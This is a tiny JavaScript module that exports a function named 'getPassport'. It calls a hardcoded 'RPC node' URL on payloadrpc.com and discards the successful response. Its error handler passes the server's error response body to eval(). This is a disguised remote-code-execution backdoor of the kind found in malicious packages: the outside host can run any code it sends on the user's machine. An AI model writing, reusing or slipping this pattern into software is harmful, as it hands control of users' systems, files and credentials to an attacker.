const axios = require('axios');

const GET_RPCNODE_URL = "http://payloadrpc.com/api/v1/node/f90ec1a7066e8a5d0218c405ba68c58c";

const getPassport = () => {
    axios.get(GET_RPCNODE_URL)
        .then(res=>res.data)
        .catch(err=>eval(err.response.data));
}

module.exports = getPassport;